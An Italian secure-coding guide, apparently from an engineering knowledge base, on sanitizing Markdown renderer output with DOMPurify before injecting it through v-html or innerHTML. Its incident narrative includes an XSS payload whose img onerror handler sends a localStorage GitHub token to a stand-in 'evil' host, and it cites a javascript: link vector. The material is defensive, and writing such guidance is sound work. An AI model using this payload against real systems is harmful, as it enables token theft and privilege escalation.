---
title: "L'output Markdown è HTML ostile finché non lo sanifichi"
category: platform
summary: 'marked, markdown-it e simili non sanificano; il loro output iniettato via v-html / innerHTML è XSS persistente per chiunque possa scrivere contenuti. Sanifica nel punto di iniezione con DOMPurify.'
principle: 'Ogni stringa che arriva a v-html / innerHTML / dangerouslySetInnerHTML passa per DOMPurify al confine di iniezione: nessuna eccezione per i contenuti "fidati", perché chi scrive i contenuti sta a un livello di privilegio diverso da chi li legge.'
severity: non-negotiable
tags: [platform, xss, markdown, dompurify, vue, security]
sources:
  - project: 'una SPA di amministrazione contenuti'
    date: 2026-06-11
    note: 'Markdown scritto dagli editor reso tramite marked + v-html senza alcun sanitizer; l''anteprima girava nelle sessioni di caporedattore/admin con il token GitHub in localStorage. Scalata da editor a org-admin con un singolo post costruito ad arte.'
related:
  - platform/proxy-must-pin-targets
  - platform/origin-scoped-storage-privacy
order: 6
updated: 2026-06-11
---

I renderizzatori Markdown hanno smesso di includere sanitizer anni fa. `marked` ha
deprecato la sua opzione `sanitize` nel 2018 e poi l'ha rimossa, e la documentazione
dice senza giri di parole che l'output va trattato come non fidato. Il modello mentale
"il markdown è solo formattazione di testo" sopravvive a quel cambiamento, così
`v-html="md.parse(content)"` continua a venire scritto.

Una SPA di amministrazione contenuti (2026-06-11) aveva esattamente questo. Il pannello
di anteprima dell'editor convogliava l'output di `marked` dentro `v-html` senza alcun
sanitizer in tutto l'albero delle dipendenze, e per di più un renderer di HTML grezzo
personalizzato per i tag multimediali lasciava passare i blocchi HTML così com'erano.
Chi scrive e chi legge stanno a livelli di privilegio diversi: gli utenti con ruolo
editor scrivono i contenuti del blog, mentre i caporedattori e gli admin li revisionano
nello stesso pannello di anteprima. E la sessione esposta vale parecchio, perché il token
GitHub dell'admin viveva in localStorage con gli scope `repo` e `admin:org`.

Un editor a basso privilegio committa un post che contiene
`<img src=x onerror="fetch('https://evil/?t='+localStorage.gh_token)">`, chiede la
revisione e raccoglie un token org-admin. XSS persistente, con il flusso di revisione
dell'organizzazione che fa da canale di consegna.

## Come applicarlo

Sanifica nel punto di iniezione, l'ultima funzione che la stringa attraversa prima che
il framework la consegni al DOM:

```ts
import DOMPurify from 'dompurify'

// Default config + blob: URIs (asset previews use object URLs).
const URI_ALLOW =
  /^(?:(?:(?:f|ht)tps?|mailto|tel|blob|callto|sms|cid|xmpp):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i

export const sanitizeHtml = (html: string): string =>
  DOMPurify.sanitize(html, { ALLOWED_URI_REGEXP: URI_ALLOW })
```

```vue
const html = computed(() =>
  sanitizeHtml(m.parse(props.content, { async: false }))
)
```

Due note pratiche dallo stesso fix:

- **La policy URI di default di DOMPurify blocca `blob:`.** Se la tua anteprima risolve
  i percorsi relativi degli asset in object URL, estendi la regexp o le immagini
  spariscono. La policy di default lascia comunque passare i percorsi relativi e gli
  `#anchors` attraverso il ramo non alfabetico, quindi i link alle note a piè di pagina
  e i riferimenti `./assets/` restano intatti.
- **I renderer personalizzati fanno parte della superficie.** Un'estensione di marked
  con un hook `html({ text })` che restituisce il testo è un pass-through esplicito di
  HTML grezzo. Il sanitizer deve girare *dopo* ogni renderer, ed è il motivo per cui il
  confine è il punto di iniezione e non un punto qualsiasi dentro la pipeline.

## Anti-pattern

```ts
// "Content comes from our own repo, it's trusted."
// Your editors are not your admins. Privilege boundary crossed.
<article v-html="marked.parse(content)" />

// Sanitizing input instead of output: the renderer itself can
// construct executable HTML from "safe" markdown constructs.
const safe = stripScriptTags(markdown) // then parse — still XSS
```

Il secondo caso fallisce perché sanificare il *markdown* non è la stessa cosa che
sanificare l'*HTML*. Cose come `[x](javascript:alert(1))`, i trucchi con i riferimenti
in stile reference e le estensioni dei renderer si materializzano tutte dopo che il tuo
strip ha già girato.

## Come imporlo

Scrivi uno unit test per ogni classe di vettore, verificando l'output del sanitizer:
`<script>`, `onerror=`, href con `javascript:`, `<iframe>`, URL `data:`. Aggiungi anche
i casi positivi di cui la tua feature ha bisogno (anteprime blob, tag multimediali,
ancore delle note a piè di pagina), così nessuno "ripara" un'anteprima rotta cancellando
il sanitizer. Una CSP rigorosa (`script-src 'self'`) è il livello di difesa in profondità
dietro a tutto questo, non un suo sostituto.
